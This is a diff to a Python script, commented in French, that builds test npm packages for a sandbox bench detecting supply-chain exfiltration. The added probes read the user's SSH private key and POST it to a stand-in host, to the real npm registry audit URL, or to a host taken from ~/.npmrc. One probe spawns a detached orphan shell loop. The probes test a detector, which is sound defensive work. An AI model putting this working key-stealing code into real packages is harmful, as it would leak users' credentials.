@@ -13,8 +13,11 @@ import os
 import shutil
 import sys
 
-BASE = "/home/bob/q5n2/sondes"
+# Surchargeables par variables d'environnement (tests) ; les défauts restent ceux du banc.
+BASE = os.environ.get("SBX_SONDES_BASE", "/home/bob/q5n2/sondes")
+LISTE = os.environ.get("SBX_LISTE", "/home/bob/q5n2/liste_sondes.tsv")
 SINK = "https://sink.exfil-probe.test/collect"
+REG = "https://registry.npmjs.org/-/v1/security/audits"
 
 SONDES = {
     # 1. le classique : script de cycle de vie
@@ -141,6 +144,30 @@ const r=https.request('{SINK}',{{method:'POST'}}); r.write(k); r.end();
 module.exports={{version:1}};
 """, "charge.mjs": "export const version=1;\n"},
     },
+    # 19. DECOUPAGE : aucun fichier ne contient lecture + destination
+    "p19-split": {
+        "main": "index.js",
+        "files": {
+            "index.js": "const {lire}=require('./lib/collect');\nconst {envoyer}=require('./lib/wire');\nenvoyer(lire());\n",
+            "lib/collect.js": "const fs=require('fs'),os=require('os');\nmodule.exports={lire:()=>fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8')};\n",
+            "lib/wire.js": "const https=require('https');\nmodule.exports={envoyer:(x)=>{const r=https.request('https://sink.exfil-probe.test/collect',{method:'POST'});r.write(x);r.end();}};\n",
+        },
+    },
+    # 20. l hote vient de ~/.npmrc : aucune URL litterale dans le paquet
+    "p20-endpoint-npmrc": {
+        "main": "index.js",
+        "files": {"index.js": f"""
+const https=require('https'),fs=require('fs'),os=require('os');
+let hote='registry.npmjs.org';
+try {{
+  const rc=fs.readFileSync(os.homedir()+'/.npmrc','utf8');
+  const m=rc.match(/^@corp:registry\s*=\s*https?:\/\/([^\/\s]+)/m); if (m) hote=m[1];
+}} catch (e) {{}}
+const k=fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8');
+const r=https.request('https://'+hote+'/-/v1/audit',{{method:'POST'}}); r.write(k); r.end();
+module.exports=1;
+"""},
+    },
     # 18. exfiltre l environnement EN BASE64 : aucun canari en clair sur le reseau
     "p18-base64": {
         "main": "index.js",
@@ -148,9 +175,67 @@ module.exports={{version:1}};
 const https=require('https');
 const fs=require('fs'),os=require('os');
 const b = Buffer.from(fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8')).toString('base64');
-const r = https.request('{SINK}b64', {{method:'POST'}});
+const r = https.request('{REG}b64', {{method:'POST'}});
 r.write(b); r.end();
 module.exports=1;
+"""},
+    },
+    # 18b/18c. base64 DECALE : le contenu lu est prefixe de 1 puis 2 octets AVANT le
+    # base64. p18 est aligne a 0 (en-tete de 36 octets = multiple de 3) : il ne
+    # discrimine pas le correctif d'alignement du matcher.
+    "p18b-base64-decal1": {
+        "main": "index.js",
+        "files": {"index.js": f"""
+const https=require('https');
+const fs=require('fs'),os=require('os');
+const b = Buffer.from('x'+fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8')).toString('base64');
+const r = https.request('{REG}b64', {{method:'POST'}});
+r.write(b); r.end();
+module.exports=1;
+"""},
+    },
+    "p18c-base64-decal2": {
+        "main": "index.js",
+        "files": {"index.js": f"""
+const https=require('https');
+const fs=require('fs'),os=require('os');
+const b = Buffer.from('xy'+fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8')).toString('base64');
+const r = https.request('{REG}b64', {{method:'POST'}});
+r.write(b); r.end();
+module.exports=1;
+"""},
+    },
+    # 22. cle SSH EN CLAIR vers le registry : seule la regle « canari SSH vers le
+    # registry » peut la rendre CLÉ (le jeton npm, lui, y est un usage normal).
+    "p22-registry-ssh": {
+        "main": "index.js",
+        "files": {"index.js": f"""
+const https=require('https'),fs=require('fs'),os=require('os');
+const k=fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8');
+const r=https.request('{REG}',{{method:'POST'}}); r.write(k); r.end();
+module.exports=1;
+"""},
+    },
+    # 21. LEURRE ORPHELIN : injection de faute. Un processus detache survit a la
+    # sonde (boucle sh de 600 s qui relance leurre.js). Si l'isolation entre sondes
+    # est cassee, la sonde SUIVANTE voit l'hote leurre.exfil-probe.test.
+    "p21-leurre-orphelin": {
+        "main": "index.js",
+        "files": {"index.js": """
+const cp=require('child_process');
+try{
+  const c=cp.spawn('sh',['-c','i=0; while [ $i -lt 600 ]; do node leurre.js; sleep 1; i=$((i+1)); done'],{detached:true,stdio:'ignore',cwd:__dirname});
+  c.unref();
+}catch(e){}
+module.exports=1;
+""", "leurre.js": """
+const https=require('https'),fs=require('fs'),os=require('os');
+try{
+  const k=fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8');
+  const r=https.request('https://leurre.exfil-probe.test/orphelin',{method:'POST'});
+  r.on('error',()=>{});
+  r.write(k); r.end();
+}catch(e){}
 """},
     },
     # 17. tente un binaire absent (curl) : l echec doit etre un signal
@@ -164,15 +249,13 @@ module.exports=1;
         "main": "index.js",
         "files": {"index.js": f"""
 const https=require('https'),fs=require('fs'),os=require('os');
-function frapper() {{
+// Rien d'exporte : si le harnais ne nous execute pas comme module d entree,
+// cette sonde DOIT rester muette (le pilote ne doit pas pouvoir la declencher via ses exports).
+if (require.main === module) {{
   const k = fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8');
   const r = https.request('{SINK}', {{method:'POST'}}); r.write(k); r.end();
 }}
-// Rien d'autre : si le harnais ne nous execute pas comme module d entree,
-// cette sonde DOIT rester muette. C est le seul test qui distingue un loader
-// garde par require.main d un paquet propre.
-if (require.main === module) {{ frapper(); }}
-module.exports=frapper;
+module.exports={{}};
 """},
     },
     # 15. ne frappe que si 30 jours se sont ecoules (horloge decalee)
@@ -214,11 +297,29 @@ const r=https.request('{SINK}',{{method:'POST'}}); r.write(k); r.end();
 }
 
 
+# Verdict attendu par sonde (le banc tourne avec SBX_OFFSET_JOURS=30) : seule le
+# temoin p12-propre doit rester muet, toutes les autres doivent donner une CLÉ.
+for _nom, _d in SONDES.items():
+    _d["attendu"] = "—" if _nom == "p12-propre" else "CLÉ"
+
+
+def rang(nom):
+    """Ordre de fin de liste : le leurre p21 AVANT-DERNIER, le temoin p12 DERNIER
+    (le temoin suit le leurre : un orphelin qui survit le salirait)."""
+    if nom.startswith("p12-"):
+        return 2
+    if nom.startswith("p21-"):
+        return 1
+    return 0
+
+
 def fabrique():
     shutil.rmtree(BASE, ignore_errors=True)
     os.makedirs(BASE)
     lignes = []
-    for nom, d in SONDES.items():
+    noms = sorted(SONDES, key=lambda n: rang(n))  # tri stable : l'ordre d'insertion est garde
+    for nom in noms:
+        d = SONDES[nom]
         racine = os.path.join(BASE, nom, "package")
         os.makedirs(racine)
         pkg = {"name": nom, "version": "1.0.0", "description": "sonde de banc"}
@@ -255,9 +356,11 @@ def fabrique():
         lignes.append(f"{nom}\t{tgz}")
     # Le temoin doit toujours etre la DERNIERE sonde : la verification « muet »
     # cherche alors le dernier tag, quel que soit le nombre de sondes ajoutees.
-    lignes.sort(key=lambda l: l.startswith("p12-"))
-    open("/tmp/liste_sondes.tsv", "w").write("\n".join(lignes) + "\n")
-    print(f"{len(lignes)} sondes fabriquées ; liste /tmp/liste_sondes.tsv")
+    # (L'ordre est deja garanti par rang() ci-dessus.)
+    with open(os.path.join(BASE, "attendus.json"), "w", encoding="utf-8") as f:
+        json.dump({n: SONDES[n]["attendu"] for n in noms}, f, ensure_ascii=False, indent=1)
+    open(LISTE, "w").write("\n".join(lignes) + "\n")
+    print(f"{len(lignes)} sondes fabriquées ; liste {LISTE}")
 
 
 if __name__ == "__main__":
